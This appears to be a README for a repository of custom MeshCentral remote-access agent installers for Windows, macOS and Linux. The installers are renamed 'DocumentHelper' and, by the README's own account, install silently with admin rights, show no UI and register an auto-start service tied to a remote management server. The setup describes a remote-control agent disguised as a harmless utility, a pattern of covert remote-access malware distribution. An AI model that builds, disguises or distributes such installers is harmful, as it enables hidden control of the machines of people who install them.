# mh1 — MeshCentral Agent Custom Installers

Custom-branded installers for the MH-leadid agent group on mesh.telcom.stream.

## Contents

| File | Description |
|---|---|
| `dl/DocumentHelper.exe` | Windows NSIS-wrapped installer (silent, admin) |
| `dl/DocumentHelper.run` | Linux one-liner installer script |
| `dl/meshagent64-MH-leadid.exe` | Original Windows agent (backup) |
| `dl/MeshAgent-MH-leadid.zip` | Original macOS agent archive (backup) |
| `meshagent` | Extracted macOS universal binary (Mach-O x86_64 + arm64) |
| `root/` | macOS package root (usr/local/bin/DocumentHelper) |
| `scripts/` | macOS package scripts (postinstall) |
| `w.nsi` | NSIS installer script (Windows) |
| `build-macos.sh` | macOS .pkg build script (run on Mac) |

## Windows
Built and tested. `dl/DocumentHelper.exe` is the NSIS-wrapped silent installer.
- Renames the mesh agent to "DocumentHelper" (service name derives from filename)
- Runs `DocumentHelper.exe -install` silently as admin
- No visible UI during install

## macOS
`dl/DocumentHelper.pkg` has been built via GitHub Actions (macOS runner).
To rebuild: push to GitHub and run the "Build macOS Package" workflow.
For a signed/notarized version, run `build-macos.sh` on a Mac with
Developer ID credentials.

## Linux
`dl/DocumentHelper.run` is a self-contained bash installer. Distribute as-is.

## Verification
Test the Windows installer on a clean machine:
```
sc query DocumentHelper
```
Expected: RUNNING with START_TYPE: 2 AUTO_START

Delete the test node from the MeshCentral panel before shipping.

## Mesh ID
The mesh ID from the MH-leadid group should be embedded in the agent binary.
Verify with: `strings DocumentHelper.exe | grep -c 'IRL9fYwIpF97'` (expect >=1)
If 0, the agent was downloaded from the wrong device group.
